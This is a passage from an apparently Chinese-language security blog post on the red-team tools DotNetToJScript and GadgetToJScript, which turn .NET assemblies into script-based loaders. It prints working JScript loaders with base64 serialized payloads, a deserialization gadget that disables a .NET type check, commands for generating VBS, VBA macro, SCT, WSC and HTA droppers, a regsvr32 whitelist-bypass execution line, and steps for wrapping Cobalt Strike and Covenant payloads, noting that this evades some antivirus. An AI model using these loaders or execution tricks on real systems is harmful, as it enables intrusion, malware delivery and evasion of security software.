class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAA"</span>+</span><br><span class="line"><span class="string">"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"</span>+</span><br><span class="line"><span class="string">"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"</span>+</span><br><span class="line"><span class="string">"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBn"</span>+</span><br><span class="line"><span class="string">"AEYAaQBsAGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0A"</span>+</span><br><span class="line"><span class="string">"ZQBuAHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0"</span>+</span><br><span class="line"><span class="string">"AE4AZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBw"</span>+</span><br><span class="line"><span class="string">"AGwAZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEA"</span>+</span><br><span class="line"><span class="string">"LgAwAC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABs"</span>+</span><br><span class="line"><span class="string">"AGUAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkA"</span>+</span><br><span class="line"><span class="string">"ZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3"</span>+</span><br><span class="line"><span class="string">"ACAAMgAwADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AABQABQAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBB"</span>+</span><br><span class="line"><span class="string">"AHMAcwBlAG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAA"</span>+</span><br><span class="line"><span class="string">"RQB4AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQBy"</span>+</span><br><span class="line"><span class="string">"AHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIA"</span>+</span><br><span class="line"><span class="string">"cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABw4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"</span>+</span><br><span class="line"><span class="string">"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"</span>;</span><br><span class="line"><span class="keyword">var</span> entry_class = <span class="string">'TestClass'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">setversion();</span><br><span class="line"><span class="keyword">var</span> stm = base64ToStream(serialized_obj);</span><br><span class="line"><span class="keyword">var</span> fmt = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line"><span class="keyword">var</span> al = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Collections.ArrayList'</span>);</span><br><span class="line"><span class="keyword">var</span> d = fmt.Deserialize_2(stm);</span><br><span class="line">al.Add(<span class="literal">undefined</span>);</span><br><span class="line"><span class="keyword">var</span> o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    debug(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到都是需要调用.net中的库，然后进行一个反序列化解密的过程</p><h4 id="ToVBS"><a href="#ToVBS" class="headerlink" title="ToVBS"></a>ToVBS</h4><p>需要注意的是，生成VBS脚本需要使用<code>-l</code>参数指定vbscript<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -l vbscript -o test2.vbs ExampleAssembly.dll</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/9E783D6C-FD64-462D-A8EA-3A4496D23332.png" alt="2ab489a15717637018bdd621de3f2895"></p><h4 id="ToVBA"><a href="#ToVBA" class="headerlink" title="ToVBA"></a>ToVBA</h4><p>生成的VBA可以用来插入office宏<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -l vba -o test.txt ExampleAssembly.dll</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/8437C1F8-4A99-4716-BFB9-94F7839872BC.png" alt="60c153e14a78918d7f3f2cec5adb6724"></p><h4 id="ToSCT"><a href="#ToSCT" class="headerlink" title="ToSCT"></a>ToSCT</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -u -o test.sct ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B905E07D-9F7A-438E-8C9A-1CE6BCAE65AE.png" alt="8f5c4cd923308caae40f49dc31a31122"></p><p>利用<code>regsvr32.exe</code>白名单执行<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /u /n /s /i:test.sct scrobj.dll</span><br></pre></td></tr></table></figure></p><h4 id="ToWSC"><a href="#ToWSC" class="headerlink" title="ToWSC"></a>ToWSC</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -m -o test.wsc ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p>生成的wsc文件只需要在其他js/asp环境下调用即可<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject("script:C:\\Users\\Patrilic\\Desktop\\DotNetToJScript\\DotNetToJScript\\bin\\Debug\\test.wsc");</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/977C7010-C087-4D70-A085-AA2BB893D9FD.png" alt="5587bb1b29e99df5966bbaf5114dcc3e"></p><h4 id="With-Covenaut"><a href="#With-Covenaut" class="headerlink" title="With Covenaut"></a>With Covenaut</h4><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/95A05AA7-24A5-445B-B111-DC8ED95CDF31.png" alt="569761d6f2b8efec74a347c56f84d621"><br><strong>.Net程序都可以直接-c指定类去转换</strong></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7C5D1050-B572-4215-87ED-6C26456CB1FC.png" alt="6c75c4aca52c0e0952cdb3258d569b0c"></p><h4 id="With-Powershell"><a href="#With-Powershell" class="headerlink" title="With Powershell"></a>With Powershell</h4><p>利用<a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">StarFighters</a> 可以直接在vbs和js中执行powershell代码</p><p>在test.txt中写入cs的web_delivery<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/358C100B-7087-4BA8-8EC3-0C73B8E24B50.png" alt="057cd5f957fc05147a3ee93820708327"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="built_in">Get-Content</span> -Path test.txt</span><br><span class="line"><span class="variable">$bytes</span>  = [System.Text.Encoding]::UNICODE.GetBytes(<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [System.Convert]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$encoded</span></span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/1A0348EE-0D14-4792-BD99-CD512A4549AC.png" alt="3f7de06beaa326e045148bedb33abc7a"></p><p>替换<code>EncodedPayload</code><br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/F31857A2-6F04-4BA4-814A-D26047AEA2AB.png" alt="76576829f365f78c38ebada4e43bbc10"><br>芜湖～</p><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p>整个包分为两个项目<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/742D69B1-6387-46F0-9EEF-F3EA2985B974.png" alt="cc2f1c14330049f22602b8352908b363"></p><p>主要还是<code>DotNetToJScript</code><br>在Program.cs的程序开始就定义了三个Language<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7CB3112C-2412-4660-B935-1B9C3003D870.png" alt="b1b74cc2f4f5caa3fd3d1f3eac883757"></p><p>在<code>IScriptGenerator</code>中定义了接口，然后在switch语句中选取具体的生成器<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/0CEB8EE1-C462-43B3-8E24-F7F8179A895A.png" alt="231ebb9c6369136f0385a5f6fb4f369a"></p><p>数据经过处理加密后，直接<code>Properties.Resources.jscript_template.Replace</code>替换模版中的变量<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/01335C9D-DF6C-4352-8DD3-AA085329F242.png" alt="489a50d7e2a4e1e5318e1bc2891264a8"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/335C4830-344D-40C3-A23E-46781CF6D10D.png" alt="3a31a1fdbe4ab02a06b4472bbb508987"></p><h2 id="0x02-GadgetToJScript"><a href="#0x02-GadgetToJScript" class="headerlink" title="0x02 GadgetToJScript"></a>0x02 GadgetToJScript</h2><h3 id="Build-1"><a href="#Build-1" class="headerlink" title="Build"></a>Build</h3><p>Github: <a href="https://github.com/med0x2e/GadgetToJScript" target="_blank" rel="noopener">https://github.com/med0x2e/GadgetToJScript</a></p><p>我这里使用 <strong>.NET 4.6.1</strong> 直接可以编译成功<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/6998CCD9-91C3-4485-8F42-8B0DB5619759.png" alt="2a951b1b0f5b7229da9de144829ac6c4"></p><h3 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h3><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/D50EBB82-33D2-45B2-A99B-5E327C62A12E.png" alt="788bf013f81071940291182e2345e99b"></p><p>原程序默认提供了<code>js,vbs,vba,hta</code>，四种文件转换</p><h4 id="ToJS-1"><a href="#ToJS-1" class="headerlink" title="ToJS"></a>ToJS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w js -e hex -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/83247BFE-B124-4018-9C86-0534848766C3.png" alt="c0816446e99a6f049dcf24a309d6bbec"></p><p>老规矩，看看源码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base64ToStream</span>(<span class="params">b,l</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line">ms.Write(ba, <span class="number">0</span>, l);</span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stage_1 = <span class="string">"AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVzb3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIg0KICAgICAgICAgICAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogICAgICAgICAgICB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiINCiAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNvbmZpZ3VyYXRpb24iDQogICAgICAgICAgICB4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5PW1zY29ybGliIj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHI6QmluZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2ROYW1lPSJTZXRWYWx1ZSI+DQogICAgICAgICAgICAgICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpCb29sZWFuPnRydWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9kZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNvdXJjZURpY3Rpb25hcnk+Cw=="</span>;</span><br><span class="line"><span class="keyword">var</span> stage_2 = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> ActiveXObject(<span class="string">'WScript.Shell'</span>);</span><br><span class="line">ver = <span class="string">'v4.0.30319'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">shell.RegRead(<span class="string">'HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123; </span><br><span class="line">ver = <span class="string">'v2.0.50727'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell.Environment(<span class="string">'Process'</span>)(<span class="string">'COMPLUS_Version'</span>) = ver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ms_1 = Base64ToStream(stage_1, <span class="number">2341</span>);</span><br><span class="line"><span class="keyword">var</span> fmt_1 = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line">fmt_1.Deserialize_2(ms_1);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ms_2 = Base64ToStream(stage_2, <span class="number">9073</span>);</span><br><span class="line"><span class="keyword">var</span> fmt_2 = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line">fmt_2.Deserialize_2(ms_2);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span> (e2)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现他同样是调用了<code>System.Runtime.Serialization</code>，通过对两个var的反序列化操作，从而执行</p><h4 id="ToVBS-1"><a href="#ToVBS-1" class="headerlink" title="ToVBS"></a>ToVBS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w vbs -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/BE486433-85F9-448D-BEBD-EBFA9A50436B.png" alt="a1155707ec2d37a33a56419d88f7d42c"></p><h4 id="ToVBA-1"><a href="#ToVBA-1" class="headerlink" title="ToVBA"></a>ToVBA</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w vba -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/69BE87FE-3C56-4E0B-9810-56D228DE9416.png" alt="b743bbeda5efe5d671d80d37b608f8ae"></p><h4 id="ToHta"><a href="#ToHta" class="headerlink" title="ToHta"></a>ToHta</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w hta -e b64 -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/F4D5151C-9BB1-431F-8433-45EC5FA4B541.png" alt="3d4f965a8df23a1587cb482314bbe890"></p><h4 id="With-CobaltStrike-Covenant"><a href="#With-CobaltStrike-Covenant" class="headerlink" title="With CobaltStrike/Covenant"></a>With CobaltStrike/Covenant</h4><p>利用cs产生的shellcode进行加载<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/5693697E-4B11-4863-9EC1-B9BA33C9C584.png" alt="ad6e9841f325ef8cfe1017e805955d0b"></p><p>当然，需要修改一下程序获取cs代码的地方<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/691764A8-EAAB-4B38-A1A0-1BEB55D3D4F4.png" alt="3a0df07cf0611417e3d2e7992c01fffa"></p><p>这也是三好学生师傅的方法，同样的，也可以自定义一个参数进行输入。</p><p>Covenant提供了Binary的源代码，也可以直接加载<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/C0170DB0-C8E9-4BF2-9DFA-2B120B6FD4B3.png" alt="2b76ba5f5c1668f3746da3fd7bf9a777"></p><h3 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h3><p>首先，<code>GadgetToJScript</code>相比于<code>DotNetToJScript</code>来说，在反序列化的时候不需要调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DynamicInvoke(al.ToArray()).CreateInstance(CLASS)</span><br></pre></td></tr></table></figure></p><p>可以规避一些杀软的检测。再者，更适合进行二次开发，这点之前<code>RedCore@Moriarty</code>师傅已经演示过针对GadgetToJScript的二次开发，以及深度使用了。</p><p>和之前一样，GadgetToJScript也是通过模版进行转换<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/28D65DAE-70F0-4D05-BF03-158507C27264.png" alt="ead4d3d00d81660fa06730d31b6f1cab"></p><p>提供了4种脚本类型和2种编码<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/945108D9-6949-4D05-BD09-61967B79FC42.png" alt="7e1173be4991970ea94100facd3a6e76"></p><p>根据<code>_wsh</code>选取对应模版<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7E7B6643-A665-4707-AFDA-D346015D179F.png" alt="2b3316a440cd16aed3f3d6a2c8c6c501"></p><p>后面就是针对具体类型的一些替换变量<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7E2C3CDF-7C60-45CD-A70E-7A2832AED6D1.png" alt="13a71f77aa239c5765a1f25e96179362"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/902E2F50-75B6-46D7-9EDF-0205DA84D9BF.png" 